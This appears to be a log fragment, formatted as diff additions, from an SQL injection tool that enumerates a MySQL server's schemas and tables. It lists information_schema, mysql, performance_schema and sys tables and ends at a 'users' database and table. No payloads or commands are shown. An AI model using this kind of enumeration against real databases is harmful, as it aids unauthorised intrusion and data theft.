+[00:10:56] [INFO] retrieved: 'INNODB_SYS_FOREIGN_COLS'
+[00:10:56] [INFO] retrieved: 'information_schema'
+[00:10:57] [INFO] retrieved: 'INNODB_CMPMEM'
+[00:10:57] [INFO] retrieved: 'information_schema'
+[00:10:58] [INFO] retrieved: 'INNODB_BUFFER_POOL_STATS'
+[00:10:58] [INFO] retrieved: 'information_schema'
+[00:10:59] [INFO] retrieved: 'INNODB_SYS_COLUMNS'
+[00:10:59] [INFO] retrieved: 'information_schema'
+[00:11:00] [INFO] retrieved: 'INNODB_SYS_FOREIGN'
+[00:11:00] [INFO] retrieved: 'information_schema'
+[00:11:01] [INFO] retrieved: 'INNODB_SYS_TABLESTATS'
+[00:11:01] [INFO] retrieved: 'mysql'
+[00:11:02] [INFO] retrieved: 'columns_priv'
+[00:11:03] [INFO] retrieved: 'mysql'
+[00:11:05] [INFO] retrieved: 'db'
+[00:11:06] [INFO] retrieved: 'mysql'
+[00:11:06] [INFO] retrieved: 'engine_cost'
+[00:11:06] [INFO] retrieved: 'mysql'
+[00:11:07] [INFO] retrieved: 'event'
+[00:11:07] [INFO] retrieved: 'mysql'
+[00:11:08] [INFO] retrieved: 'func'
+[00:11:08] [INFO] retrieved: 'mysql'
+[00:11:09] [INFO] retrieved: 'general_log'
+[00:11:09] [INFO] retrieved: 'mysql'
+[00:11:10] [INFO] retrieved: 'gtid_executed'
+[00:11:10] [INFO] retrieved: 'mysql'
+[00:11:11] [INFO] retrieved: 'help_category'
+[00:11:11] [INFO] retrieved: 'mysql'
+[00:11:12] [INFO] retrieved: 'help_keyword'
+[00:11:13] [INFO] retrieved: 'mysql'
+[00:11:13] [INFO] retrieved: 'help_relation'
+[00:11:14] [INFO] retrieved: 'mysql'
+[00:11:14] [INFO] retrieved: 'help_topic'
+[00:11:18] [INFO] retrieved: 'mysql'
+[00:11:18] [INFO] retrieved: 'innodb_index_stats'
+[00:11:18] [INFO] retrieved: 'mysql'
+[00:11:19] [INFO] retrieved: 'innodb_table_stats'
+[00:11:19] [INFO] retrieved: 'mysql'
+[00:11:20] [INFO] retrieved: 'ndb_binlog_index'
+[00:11:21] [INFO] retrieved: 'mysql'
+[00:11:22] [INFO] retrieved: 'plugin'
+[00:11:22] [INFO] retrieved: 'mysql'
+[00:11:23] [INFO] retrieved: 'proc'
+[00:11:23] [INFO] retrieved: 'mysql'
+[00:11:24] [INFO] retrieved: 'procs_priv'
+[00:11:25] [INFO] retrieved: 'mysql'
+[00:11:25] [INFO] retrieved: 'proxies_priv'
+[00:11:26] [INFO] retrieved: 'mysql'
+[00:11:26] [INFO] retrieved: 'server_cost'
+[00:11:27] [INFO] retrieved: 'mysql'
+[00:11:27] [INFO] retrieved: 'servers'
+[00:11:28] [INFO] retrieved: 'mysql'
+[00:11:28] [INFO] retrieved: 'slave_master_info'
+[00:11:29] [INFO] retrieved: 'mysql'
+[00:11:30] [INFO] retrieved: 'slave_relay_log_info'
+[00:11:30] [INFO] retrieved: 'mysql'
+[00:11:30] [INFO] retrieved: 'slave_worker_info'
+[00:11:31] [INFO] retrieved: 'mysql'
+[00:11:32] [INFO] retrieved: 'slow_log'
+[00:11:32] [INFO] retrieved: 'mysql'
+[00:11:33] [INFO] retrieved: 'tables_priv'
+[00:11:34] [INFO] retrieved: 'mysql'
+[00:11:35] [INFO] retrieved: 'time_zone'
+[00:11:35] [INFO] retrieved: 'mysql'
+[00:11:36] [INFO] retrieved: 'time_zone_leap_second'
+[00:11:36] [INFO] retrieved: 'mysql'
+[00:11:37] [INFO] retrieved: 'time_zone_name'
+[00:11:37] [INFO] retrieved: 'mysql'
+[00:11:38] [INFO] retrieved: 'time_zone_transition'
+[00:11:39] [INFO] retrieved: 'mysql'
+[00:11:39] [INFO] retrieved: 'time_zone_transition_type'
+[00:11:40] [INFO] retrieved: 'mysql'
+[00:11:40] [INFO] retrieved: 'user'
+[00:11:41] [INFO] retrieved: 'performance_schema'
+[00:11:41] [INFO] retrieved: 'accounts'
+[00:11:42] [INFO] retrieved: 'performance_schema'
+[00:11:43] [INFO] retrieved: 'cond_instances'
+[00:11:43] [INFO] retrieved: 'performance_schema'
+[00:11:44] [INFO] retrieved: 'events_stages_current'
+[00:11:44] [INFO] retrieved: 'performance_schema'
+[00:11:45] [INFO] retrieved: 'events_stages_history'
+[00:11:45] [INFO] retrieved: 'performance_schema'
+[00:11:46] [INFO] retrieved: 'events_stages_history_long'
+[00:11:47] [INFO] retrieved: 'performance_schema'
+[00:11:47] [INFO] retrieved: 'events_stages_summary_by_account_by_event_name'
+[00:11:48] [INFO] retrieved: 'performance_schema'
+[00:11:49] [INFO] retrieved: 'events_stages_summary_by_host_by_event_name'
+[00:11:49] [INFO] retrieved: 'performance_schema'
+[00:11:50] [INFO] retrieved: 'events_stages_summary_by_thread_by_event_name'
+[00:11:50] [INFO] retrieved: 'performance_schema'
+[00:11:51] [INFO] retrieved: 'events_stages_summary_by_user_by_event_name'
+[00:11:51] [INFO] retrieved: 'performance_schema'
+[00:11:52] [INFO] retrieved: 'events_stages_summary_global_by_event_name'
+[00:11:52] [INFO] retrieved: 'performance_schema'
+[00:11:52] [INFO] retrieved: 'events_statements_current'
+[00:11:53] [INFO] retrieved: 'performance_schema'
+[00:11:53] [INFO] retrieved: 'events_statements_history'
+[00:11:54] [INFO] retrieved: 'performance_schema'
+[00:11:54] [INFO] retrieved: 'events_statements_history_long'
+[00:11:55] [INFO] retrieved: 'performance_schema'
+[00:11:55] [INFO] retrieved: 'events_statements_summary_by_account_by_event_name'
+[00:11:56] [INFO] retrieved: 'performance_schema'
+[00:11:57] [INFO] retrieved: 'events_statements_summary_by_digest'
+[00:11:58] [INFO] retrieved: 'performance_schema'
+[00:11:58] [INFO] retrieved: 'events_statements_summary_by_host_by_event_name'
+[00:11:59] [INFO] retrieved: 'performance_schema'
+[00:11:59] [INFO] retrieved: 'events_statements_summary_by_program'
+[00:11:59] [INFO] retrieved: 'performance_schema'
+[00:12:00] [INFO] retrieved: 'events_statements_summary_by_thread_by_event_name'
+[00:12:00] [INFO] retrieved: 'performance_schema'
+[00:12:01] [INFO] retrieved: 'events_statements_summary_by_user_by_event_name'
+[00:12:01] [INFO] retrieved: 'performance_schema'
+[00:12:02] [INFO] retrieved: 'events_statements_summary_global_by_event_name'
+[00:12:02] [INFO] retrieved: 'performance_schema'
+[00:12:03] [INFO] retrieved: 'events_transactions_current'
+[00:12:03] [INFO] retrieved: 'performance_schema'
+[00:12:04] [INFO] retrieved: 'events_transactions_history'
+[00:12:04] [INFO] retrieved: 'performance_schema'
+[00:12:05] [INFO] retrieved: 'events_transactions_history_long'
+[00:12:05] [INFO] retrieved: 'performance_schema'
+[00:12:06] [INFO] retrieved: 'events_transactions_summary_by_account_by_event_name'
+[00:12:06] [INFO] retrieved: 'performance_schema'
+[00:12:06] [INFO] retrieved: 'events_transactions_summary_by_host_by_event_name'
+[00:12:07] [INFO] retrieved: 'performance_schema'
+[00:12:08] [INFO] retrieved: 'events_transactions_summary_by_thread_by_event_name'
+[00:12:09] [INFO] retrieved: 'performance_schema'
+[00:12:09] [INFO] retrieved: 'events_transactions_summary_by_user_by_event_name'
+[00:12:10] [INFO] retrieved: 'performance_schema'
+[00:12:10] [INFO] retrieved: 'events_transactions_summary_global_by_event_name'
+[00:12:11] [INFO] retrieved: 'performance_schema'
+[00:12:11] [INFO] retrieved: 'events_waits_current'
+[00:12:12] [INFO] retrieved: 'performance_schema'
+[00:12:12] [INFO] retrieved: 'events_waits_history'
+[00:12:13] [INFO] retrieved: 'performance_schema'
+[00:12:13] [INFO] retrieved: 'events_waits_history_long'
+[00:12:14] [INFO] retrieved: 'performance_schema'
+[00:12:14] [INFO] retrieved: 'events_waits_summary_by_account_by_event_name'
+[00:12:15] [INFO] retrieved: 'performance_schema'
+[00:12:15] [INFO] retrieved: 'events_waits_summary_by_host_by_event_name'
+[00:12:17] [INFO] retrieved: 'performance_schema'
+[00:12:17] [INFO] retrieved: 'events_waits_summary_by_instance'
+[00:12:18] [INFO] retrieved: 'performance_schema'
+[00:12:18] [INFO] retrieved: 'events_waits_summary_by_thread_by_event_name'
+[00:12:19] [INFO] retrieved: 'performance_schema'
+[00:12:20] [INFO] retrieved: 'events_waits_summary_by_user_by_event_name'
+[00:12:20] [INFO] retrieved: 'performance_schema'
+[00:12:23] [INFO] retrieved: 'events_waits_summary_global_by_event_name'
+[00:12:23] [INFO] retrieved: 'performance_schema'
+[00:12:24] [INFO] retrieved: 'file_instances'
+[00:12:25] [INFO] retrieved: 'performance_schema'
+[00:12:26] [INFO] retrieved: 'file_summary_by_event_name'
+[00:12:26] [INFO] retrieved: 'performance_schema'
+[00:12:27] [INFO] retrieved: 'file_summary_by_instance'
+[00:12:28] [INFO] retrieved: 'performance_schema'
+[00:12:28] [INFO] retrieved: 'global_status'
+[00:12:29] [INFO] retrieved: 'performance_schema'
+[00:12:29] [INFO] retrieved: 'global_variables'
+[00:12:30] [INFO] retrieved: 'performance_schema'
+[00:12:30] [INFO] retrieved: 'host_cache'
+[00:12:31] [INFO] retrieved: 'performance_schema'
+[00:12:32] [INFO] retrieved: 'hosts'
+[00:12:32] [INFO] retrieved: 'performance_schema'
+[00:12:33] [INFO] retrieved: 'memory_summary_by_account_by_event_name'
+[00:12:33] [INFO] retrieved: 'performance_schema'
+[00:12:33] [INFO] retrieved: 'memory_summary_by_host_by_event_name'
+[00:12:36] [INFO] retrieved: 'performance_schema'
+[00:12:39] [INFO] retrieved: 'memory_summary_by_thread_by_event_name'
+[00:12:43] [INFO] retrieved: 'performance_schema'
+[00:12:44] [INFO] retrieved: 'memory_summary_by_user_by_event_name'
+[00:12:45] [INFO] retrieved: 'performance_schema'
+[00:12:45] [INFO] retrieved: 'memory_summary_global_by_event_name'
+[00:12:46] [INFO] retrieved: 'performance_schema'
+[00:12:46] [INFO] retrieved: 'metadata_locks'
+[00:12:46] [INFO] retrieved: 'performance_schema'
+[00:12:50] [INFO] retrieved: 'mutex_instances'
+[00:12:52] [INFO] retrieved: 'performance_schema'
+[00:12:52] [INFO] retrieved: 'objects_summary_global_by_type'
+[00:12:53] [INFO] retrieved: 'performance_schema'
+[00:12:53] [INFO] retrieved: 'performance_timers'
+[00:12:54] [INFO] retrieved: 'performance_schema'
+[00:12:55] [INFO] retrieved: 'prepared_statements_instances'
+[00:12:55] [INFO] retrieved: 'performance_schema'
+[00:12:56] [INFO] retrieved: 'replication_applier_configuration'
+[00:12:56] [INFO] retrieved: 'performance_schema'
+[00:12:57] [INFO] retrieved: 'replication_applier_status'
+[00:12:57] [INFO] retrieved: 'performance_schema'
+[00:12:58] [INFO] retrieved: 'replication_applier_status_by_coordinator'
+[00:12:59] [INFO] retrieved: 'performance_schema'
+[00:12:59] [INFO] retrieved: 'replication_applier_status_by_worker'
+[00:13:00] [INFO] retrieved: 'performance_schema'
+[00:13:00] [INFO] retrieved: 'replication_connection_configuration'
+[00:13:01] [INFO] retrieved: 'performance_schema'
+[00:13:01] [INFO] retrieved: 'replication_connection_status'
+[00:13:02] [INFO] retrieved: 'performance_schema'
+[00:13:02] [INFO] retrieved: 'replication_group_member_stats'
+[00:13:03] [INFO] retrieved: 'performance_schema'
+[00:13:03] [INFO] retrieved: 'replication_group_members'
+[00:13:04] [INFO] retrieved: 'performance_schema'
+[00:13:04] [INFO] retrieved: 'rwlock_instances'
+[00:13:05] [INFO] retrieved: 'performance_schema'
+[00:13:05] [INFO] retrieved: 'session_account_connect_attrs'
+[00:13:06] [INFO] retrieved: 'performance_schema'
+[00:13:06] [INFO] retrieved: 'session_connect_attrs'
+[00:13:07] [INFO] retrieved: 'performance_schema'
+[00:13:07] [INFO] retrieved: 'session_status'
+[00:13:07] [INFO] retrieved: 'performance_schema'
+[00:13:08] [INFO] retrieved: 'session_variables'
+[00:13:09] [INFO] retrieved: 'performance_schema'
+[00:13:09] [INFO] retrieved: 'setup_actors'
+[00:13:10] [INFO] retrieved: 'performance_schema'
+[00:13:11] [INFO] retrieved: 'setup_consumers'
+[00:13:12] [INFO] retrieved: 'performance_schema'
+[00:13:12] [INFO] retrieved: 'setup_instruments'
+[00:13:13] [INFO] retrieved: 'performance_schema'
+[00:13:14] [INFO] retrieved: 'setup_objects'
+[00:13:15] [INFO] retrieved: 'performance_schema'
+[00:13:15] [INFO] retrieved: 'setup_timers'
+[00:13:16] [INFO] retrieved: 'performance_schema'
+[00:13:16] [INFO] retrieved: 'socket_instances'
+[00:13:17] [INFO] retrieved: 'performance_schema'
+[00:13:17] [INFO] retrieved: 'socket_summary_by_event_name'
+[00:13:18] [INFO] retrieved: 'performance_schema'
+[00:13:18] [INFO] retrieved: 'socket_summary_by_instance'
+[00:13:19] [INFO] retrieved: 'performance_schema'
+[00:13:20] [INFO] retrieved: 'status_by_account'
+[00:13:20] [INFO] retrieved: 'performance_schema'
+[00:13:21] [INFO] retrieved: 'status_by_host'
+[00:13:21] [INFO] retrieved: 'performance_schema'
+[00:13:22] [INFO] retrieved: 'status_by_thread'
+[00:13:22] [INFO] retrieved: 'performance_schema'
+[00:13:22] [INFO] retrieved: 'status_by_user'
+[00:13:23] [INFO] retrieved: 'performance_schema'
+[00:13:23] [INFO] retrieved: 'table_handles'
+[00:13:24] [INFO] retrieved: 'performance_schema'
+[00:13:25] [INFO] retrieved: 'table_io_waits_summary_by_index_usage'
+[00:13:25] [INFO] retrieved: 'performance_schema'
+[00:13:26] [INFO] retrieved: 'table_io_waits_summary_by_table'
+[00:13:26] [INFO] retrieved: 'performance_schema'
+[00:13:27] [INFO] retrieved: 'table_lock_waits_summary_by_table'
+[00:13:28] [INFO] retrieved: 'performance_schema'
+[00:13:28] [INFO] retrieved: 'threads'
+[00:13:28] [INFO] retrieved: 'performance_schema'
+[00:13:29] [INFO] retrieved: 'user_variables_by_thread'
+[00:13:29] [INFO] retrieved: 'performance_schema'
+[00:13:30] [INFO] retrieved: 'users'
+[00:13:30] [INFO] retrieved: 'performance_schema'
+[00:13:31] [INFO] retrieved: 'variables_by_thread'
+[00:13:32] [INFO] retrieved: 'sys'
+[00:13:32] [INFO] retrieved: 'host_summary'
+[00:13:33] [INFO] retrieved: 'sys'
+[00:13:33] [INFO] retrieved: 'host_summary_by_file_io'
+[00:13:33] [INFO] retrieved: 'sys'
+[00:13:34] [INFO] retrieved: 'host_summary_by_file_io_type'
+[00:13:34] [INFO] retrieved: 'sys'
+[00:13:35] [INFO] retrieved: 'host_summary_by_stages'
+[00:13:35] [INFO] retrieved: 'sys'
+[00:13:36] [INFO] retrieved: 'host_summary_by_statement_latency'
+[00:13:36] [INFO] retrieved: 'sys'
+[00:13:37] [INFO] retrieved: 'host_summary_by_statement_type'
+[00:13:38] [INFO] retrieved: 'sys'
+[00:13:39] [INFO] retrieved: 'innodb_buffer_stats_by_schema'
+[00:13:40] [INFO] retrieved: 'sys'
+[00:13:40] [INFO] retrieved: 'innodb_buffer_stats_by_table'
+[00:13:41] [INFO] retrieved: 'sys'
+[00:13:41] [INFO] retrieved: 'innodb_lock_waits'
+[00:13:42] [INFO] retrieved: 'sys'
+[00:13:42] [INFO] retrieved: 'io_by_thread_by_latency'
+[00:13:43] [INFO] retrieved: 'sys'
+[00:13:43] [INFO] retrieved: 'io_global_by_file_by_bytes'
+[00:13:43] [INFO] retrieved: 'sys'
+[00:13:50] [INFO] retrieved: 'io_global_by_file_by_latency'
+[00:13:50] [INFO] retrieved: 'sys'
+[00:13:51] [INFO] retrieved: 'io_global_by_wait_by_bytes'
+[00:13:51] [INFO] retrieved: 'sys'
+[00:13:52] [INFO] retrieved: 'io_global_by_wait_by_latency'
+[00:13:52] [INFO] retrieved: 'sys'
+[00:13:53] [INFO] retrieved: 'latest_file_io'
+[00:13:53] [INFO] retrieved: 'sys'
+[00:13:54] [INFO] retrieved: 'memory_by_host_by_current_bytes'
+[00:13:55] [INFO] retrieved: 'sys'
+[00:13:55] [INFO] retrieved: 'memory_by_thread_by_current_bytes'
+[00:13:56] [INFO] retrieved: 'sys'
+[00:13:56] [INFO] retrieved: 'memory_by_user_by_current_bytes'
+[00:13:57] [INFO] retrieved: 'sys'
+[00:13:57] [INFO] retrieved: 'memory_global_by_current_bytes'
+[00:13:58] [INFO] retrieved: 'sys'
+[00:13:58] [INFO] retrieved: 'memory_global_total'
+[00:13:59] [INFO] retrieved: 'sys'
+[00:13:59] [INFO] retrieved: 'metrics'
+[00:14:00] [INFO] retrieved: 'sys'
+[00:14:00] [INFO] retrieved: 'processlist'
+[00:14:01] [INFO] retrieved: 'sys'
+[00:14:01] [INFO] retrieved: 'ps_check_lost_instrumentation'
+[00:14:02] [INFO] retrieved: 'sys'
+[00:14:02] [INFO] retrieved: 'schema_auto_increment_columns'
+[00:14:03] [INFO] retrieved: 'sys'
+[00:14:03] [INFO] retrieved: 'schema_index_statistics'
+[00:14:04] [INFO] retrieved: 'sys'
+[00:14:04] [INFO] retrieved: 'schema_object_overview'
+[00:14:05] [INFO] retrieved: 'sys'
+[00:14:06] [INFO] retrieved: 'schema_redundant_indexes'
+[00:14:06] [INFO] retrieved: 'sys'
+[00:14:06] [INFO] retrieved: 'schema_table_lock_waits'
+[00:14:07] [INFO] retrieved: 'sys'
+[00:14:08] [INFO] retrieved: 'schema_table_statistics'
+[00:14:08] [INFO] retrieved: 'sys'
+[00:14:08] [INFO] retrieved: 'schema_table_statistics_with_buffer'
+[00:14:09] [INFO] retrieved: 'sys'
+[00:14:09] [INFO] retrieved: 'schema_tables_with_full_table_scans'
+[00:14:10] [INFO] retrieved: 'sys'
+[00:14:10] [INFO] retrieved: 'schema_unused_indexes'
+[00:14:11] [INFO] retrieved: 'sys'
+[00:14:11] [INFO] retrieved: 'session'
+[00:14:12] [INFO] retrieved: 'sys'
+[00:14:12] [INFO] retrieved: 'session_ssl_status'
+[00:14:12] [INFO] retrieved: 'sys'
+[00:14:13] [INFO] retrieved: 'statement_analysis'
+[00:14:13] [INFO] retrieved: 'sys'
+[00:14:14] [INFO] retrieved: 'statements_with_errors_or_warnings'
+[00:14:14] [INFO] retrieved: 'sys'
+[00:14:15] [INFO] retrieved: 'statements_with_full_table_scans'
+[00:14:15] [INFO] retrieved: 'sys'
+[00:14:16] [INFO] retrieved: 'statements_with_runtimes_in_95th_percentile'
+[00:14:16] [INFO] retrieved: 'sys'
+[00:14:17] [INFO] retrieved: 'statements_with_sorting'
+[00:14:18] [INFO] retrieved: 'sys'
+[00:14:18] [INFO] retrieved: 'statements_with_temp_tables'
+[00:14:19] [INFO] retrieved: 'sys'
+[00:14:19] [INFO] retrieved: 'sys_config'
+[00:14:19] [INFO] retrieved: 'sys'
+[00:14:20] [INFO] retrieved: 'user_summary'
+[00:14:20] [INFO] retrieved: 'sys'
+[00:14:21] [INFO] retrieved: 'user_summary_by_file_io'
+[00:14:21] [INFO] retrieved: 'sys'
+[00:14:22] [INFO] retrieved: 'user_summary_by_file_io_type'
+[00:14:22] [INFO] retrieved: 'sys'
+[00:14:23] [INFO] retrieved: 'user_summary_by_stages'
+[00:14:23] [INFO] retrieved: 'sys'
+[00:14:24] [INFO] retrieved: 'user_summary_by_statement_latency'
+[00:14:25] [INFO] retrieved: 'sys'
+[00:14:26] [INFO] retrieved: 'user_summary_by_statement_type'
+[00:14:27] [INFO] retrieved: 'sys'
+[00:14:27] [INFO] retrieved: 'version'
+[00:14:27] [INFO] retrieved: 'sys'
+[00:14:28] [INFO] retrieved: 'wait_classes_global_by_avg_latency'
+[00:14:29] [INFO] retrieved: 'sys'
+[00:14:29] [INFO] retrieved: 'wait_classes_global_by_latency'
+[00:14:30] [INFO] retrieved: 'sys'
+[00:14:30] [INFO] retrieved: 'waits_by_host_by_latency'
+[00:14:31] [INFO] retrieved: 'sys'
+[00:14:32] [INFO] retrieved: 'waits_by_user_by_latency'
+[00:14:33] [INFO] retrieved: 'sys'
+[00:14:33] [INFO] retrieved: 'waits_global_by_latency'
+[00:14:33] [INFO] retrieved: 'sys'
+[00:14:34] [INFO] retrieved: 'x$host_summary'
+[00:14:34] [INFO] retrieved: 'sys'
+[00:14:35] [INFO] retrieved: 'x$host_summary_by_file_io'
+[00:14:36] [INFO] retrieved: 'sys'
+[00:14:36] [INFO] retrieved: 'x$host_summary_by_file_io_type'
+[00:14:37] [INFO] retrieved: 'sys'
+[00:14:37] [INFO] retrieved: 'x$host_summary_by_stages'
+[00:14:38] [INFO] retrieved: 'sys'
+[00:14:38] [INFO] retrieved: 'x$host_summary_by_statement_latency'
+[00:14:39] [INFO] retrieved: 'sys'
+[00:14:39] [INFO] retrieved: 'x$host_summary_by_statement_type'
+[00:14:40] [INFO] retrieved: 'sys'
+[00:14:41] [INFO] retrieved: 'x$innodb_buffer_stats_by_schema'
+[00:14:41] [INFO] retrieved: 'sys'
+[00:14:42] [INFO] retrieved: 'x$innodb_buffer_stats_by_table'
+[00:14:42] [INFO] retrieved: 'sys'
+[00:14:43] [INFO] retrieved: 'x$innodb_lock_waits'
+[00:14:43] [INFO] retrieved: 'sys'
+[00:14:43] [INFO] retrieved: 'x$io_by_thread_by_latency'
+[00:14:44] [INFO] retrieved: 'sys'
+[00:14:44] [INFO] retrieved: 'x$io_global_by_file_by_bytes'
+[00:14:45] [INFO] retrieved: 'sys'
+[00:14:45] [INFO] retrieved: 'x$io_global_by_file_by_latency'
+[00:14:46] [INFO] retrieved: 'sys'
+[00:14:47] [INFO] retrieved: 'x$io_global_by_wait_by_bytes'
+[00:14:48] [INFO] retrieved: 'sys'
+[00:14:48] [INFO] retrieved: 'x$io_global_by_wait_by_latency'
+[00:14:49] [INFO] retrieved: 'sys'
+[00:14:50] [INFO] retrieved: 'x$latest_file_io'
+[00:14:50] [INFO] retrieved: 'sys'
+[00:14:51] [INFO] retrieved: 'x$memory_by_host_by_current_bytes'
+[00:14:51] [INFO] retrieved: 'sys'
+[00:14:52] [INFO] retrieved: 'x$memory_by_thread_by_current_bytes'
+[00:14:52] [INFO] retrieved: 'sys'
+[00:14:53] [INFO] retrieved: 'x$memory_by_user_by_current_bytes'
+[00:14:54] [INFO] retrieved: 'sys'
+[00:14:54] [INFO] retrieved: 'x$memory_global_by_current_bytes'
+[00:14:55] [INFO] retrieved: 'sys'
+[00:14:55] [INFO] retrieved: 'x$memory_global_total'
+[00:14:56] [INFO] retrieved: 'sys'
+[00:14:56] [INFO] retrieved: 'x$processlist'
+[00:14:57] [INFO] retrieved: 'sys'
+[00:14:57] [INFO] retrieved: 'x$ps_digest_95th_percentile_by_avg_us'
+[00:14:58] [INFO] retrieved: 'sys'
+[00:14:58] [INFO] retrieved: 'x$ps_digest_avg_latency_distribution'
+[00:14:59] [INFO] retrieved: 'sys'
+[00:14:59] [INFO] retrieved: 'x$ps_schema_table_statistics_io'
+[00:15:00] [INFO] retrieved: 'sys'
+[00:15:00] [INFO] retrieved: 'x$schema_flattened_keys'
+[00:15:01] [INFO] retrieved: 'sys'
+[00:15:01] [INFO] retrieved: 'x$schema_index_statistics'
+[00:15:02] [INFO] retrieved: 'sys'
+[00:15:02] [INFO] retrieved: 'x$schema_table_lock_waits'
+[00:15:03] [INFO] retrieved: 'sys'
+[00:15:04] [INFO] retrieved: 'x$schema_table_statistics'
+[00:15:04] [INFO] retrieved: 'sys'
+[00:15:05] [INFO] retrieved: 'x$schema_table_statistics_with_buffer'
+[00:15:05] [INFO] retrieved: 'sys'
+[00:15:06] [INFO] retrieved: 'x$schema_tables_with_full_table_scans'
+[00:15:06] [INFO] retrieved: 'sys'
+[00:15:06] [INFO] retrieved: 'x$session'
+[00:15:07] [INFO] retrieved: 'sys'
+[00:15:07] [INFO] retrieved: 'x$statement_analysis'
+[00:15:08] [INFO] retrieved: 'sys'
+[00:15:08] [INFO] retrieved: 'x$statements_with_errors_or_warnings'
+[00:15:09] [INFO] retrieved: 'sys'
+[00:15:09] [INFO] retrieved: 'x$statements_with_full_table_scans'
+[00:15:10] [INFO] retrieved: 'sys'
+[00:15:10] [INFO] retrieved: 'x$statements_with_runtimes_in_95th_percentile'
+[00:15:11] [INFO] retrieved: 'sys'
+[00:15:11] [INFO] retrieved: 'x$statements_with_sorting'
+[00:15:12] [INFO] retrieved: 'sys'
+[00:15:12] [INFO] retrieved: 'x$statements_with_temp_tables'
+[00:15:13] [INFO] retrieved: 'sys'
+[00:15:13] [INFO] retrieved: 'x$user_summary'
+[00:15:14] [INFO] retrieved: 'sys'
+[00:15:14] [INFO] retrieved: 'x$user_summary_by_file_io'
+[00:15:15] [INFO] retrieved: 'sys'
+[00:15:16] [INFO] retrieved: 'x$user_summary_by_file_io_type'
+[00:15:16] [INFO] retrieved: 'sys'
+[00:15:17] [INFO] retrieved: 'x$user_summary_by_stages'
+[00:15:20] [INFO] retrieved: 'sys'
+[00:15:21] [INFO] retrieved: 'x$user_summary_by_statement_latency'
+[00:15:21] [INFO] retrieved: 'sys'
+[00:15:21] [INFO] retrieved: 'x$user_summary_by_statement_type'
+[00:15:22] [INFO] retrieved: 'sys'
+[00:15:22] [INFO] retrieved: 'x$wait_classes_global_by_avg_latency'
+[00:15:23] [INFO] retrieved: 'sys'
+[00:15:23] [INFO] retrieved: 'x$wait_classes_global_by_latency'
+[00:15:24] [INFO] retrieved: 'sys'
+[00:15:24] [INFO] retrieved: 'x$waits_by_host_by_latency'
+[00:15:25] [INFO] retrieved: 'sys'
+[00:15:25] [INFO] retrieved: 'x$waits_by_user_by_latency'
+[00:15:26] [INFO] retrieved: 'sys'
+[00:15:33] [INFO] retrieved: 'x$waits_global_by_latency'
+[00:15:34] [INFO] retrieved: 'users'
+[00:15:34] [INFO] retrieved: 'users'
+
